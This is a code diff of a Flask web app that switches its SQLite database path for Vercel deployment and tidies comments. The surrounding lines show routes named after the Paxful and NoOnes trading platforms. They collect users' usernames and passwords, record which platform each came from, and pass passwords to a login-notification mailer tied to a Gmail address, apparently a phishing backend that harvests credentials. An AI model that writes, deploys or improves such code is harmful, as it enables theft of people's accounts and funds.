@@ -10,7 +10,13 @@ app = Flask(__name__)
 app.secret_key = 'kenaki_secret'
 app.permanent_session_lifetime = timedelta(minutes=30)
 
-# ========== Flask-Mail Configuration ========== 
+# ========== Database Path Setup ==========
+if os.getenv("VERCEL") == "1":
+    DB_PATH = "/tmp/users.db"
+else:
+    DB_PATH = "users.db"
+
+# ========== Flask-Mail Configuration ==========
 app.config['MAIL_SERVER'] = 'smtp.gmail.com'
 app.config['MAIL_PORT'] = 465
 app.config['MAIL_USE_SSL'] = True
@@ -21,9 +27,9 @@ app.config['MAIL_DEFAULT_SENDER'] = 'chasersbit439@gmail.com'
 
 mail = Mail(app)
 
-# ========== Initialize Database ========== 
+# ========== Initialize Database ==========
 def init_db():
-    conn = sqlite3.connect('users.db')
+    conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute('''
         CREATE TABLE IF NOT EXISTS users (
@@ -40,7 +46,7 @@ def init_db():
 
 init_db()
 
-# ========== Admin Login Decorator ========== 
+# ========== Admin Login Decorator ==========
 def login_required(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
@@ -49,7 +55,7 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
-# ========== Routes ========== 
+# ========== Routes ==========
 @app.route('/')
 def home():
     return render_template('index.html')
@@ -69,7 +75,7 @@ def paxful_login():
         hashed_pw = generate_password_hash(password)
 
         try:
-            conn = sqlite3.connect('users.db')
+            conn = sqlite3.connect(DB_PATH)
             c = conn.cursor()
             c.execute("INSERT INTO users (username, password, action, platform) VALUES (?, ?, ?, ?)",
                       (username, hashed_pw, action, 'paxful'))
@@ -101,7 +107,7 @@ def noones_login():
         hashed_pw = generate_password_hash(password)
 
         try:
-            conn = sqlite3.connect('users.db')
+            conn = sqlite3.connect(DB_PATH)
             c = conn.cursor()
             c.execute("INSERT INTO users (username, password, action, platform) VALUES (?, ?, ?, ?)",
                       (username, hashed_pw, action, 'noones'))
@@ -131,7 +137,7 @@ def login():
         password = data['password']
         action = data['action']
 
-        conn = sqlite3.connect('users.db')
+        conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("SELECT * FROM users WHERE username = ?", (email,))
         user = c.fetchone()
@@ -165,7 +171,7 @@ def admin_login():
 
     return render_template('admin_login.html')
 
-# ========== Send Login Notification ========== 
+# ========== Send Login Notification ==========
 def send_login_notification(username, action, password):
     try:
         message = Message(
